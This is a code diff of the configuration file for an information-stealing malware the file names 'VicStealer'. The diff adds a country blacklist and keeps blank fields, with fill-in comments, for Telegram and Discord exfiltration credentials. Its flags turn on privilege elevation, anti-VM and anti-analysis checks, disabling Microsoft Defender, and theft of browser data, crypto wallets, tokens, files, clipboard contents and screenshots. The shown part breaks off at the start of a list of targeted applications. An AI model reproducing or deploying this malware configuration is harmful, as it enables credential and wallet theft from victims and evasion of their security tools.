@@ -1,32 +1,36 @@
 """this file contains the configuration for the VicStealer malware. It includes settings for logging, anti-analysis measures, data extraction options, and application-specific configurations for stealing sensitive information from various applications."""
 
 
-config: dict[str, str] = {
+config = {
   "logFileName": f"VicSteal-New-Log",
-  "UACAdmin": True,
-  "antiVM": False,
-  "sendToTelegram": True,
-  "sendToDiscord": True,
-  "telegramBotToken": "",# write your telegram bot token here
-  "telegramChatId": "",# write your telegram chat id here
-  "discordWebhookUrl": "",# write your discord webhook url here
+  "BLACKLIST": [ # Add the country codes you want to blacklist here.
+     "ar-ma",
+     "en-ma"
+  ],
+  "UACAdmin": 1,
+  "antiVM": 1,
+  "sendToTelegram": 1,
+  "sendToDiscord": 1,
+  "telegramBotToken": "",# write your telegram bot token here.
+  "telegramChatId": "",# write your telegram chat id here.
+  "discordWebhookUrl": "",# write your discord webhook url here.
   "executionDelay": "",
-  "antiCIS": True,
-  "extractBrowsersData": True,
-  "extractWallets": True,
-  "extractGameData": True,
-  "extractFiles": True,
-  "extractSystemInfo": True,
-  "extractBrowsersVersion": True,
-  "extractTokens": True,
-  "networkSteal": True,
-  "clipboardSteal": True,
-  "defenderDisable": True,
-  "checkAnalysis": True,
-  "extractProcess": True,
-  "screanShot": True,
+  "antiCIS": 1,
+  "extractBrowsersData": 1,
+  "extractWallets": 1,
+  "extractGameData": 1,
+  "extractFiles": 1,
+  "extractSystemInfo": 1,
+  "extractBrowsersVersion": 1,
+  "extractTokens": 1,
+  "networkSteal": 1,
+  "clipboardSteal": 1,
+  "defenderDisable": 1,
+  "checkAnalysis": 1,
+  "extractProcess": 1,
+  "screanShot": 1,
   "errorMessage": "sorry, something went wrong :(",# 
-  "appCollectorEnabled": True,
+  "appCollectorEnabled": 1,
   "apps": [
     {
       "name": "Cisco AnyConnect VPN",
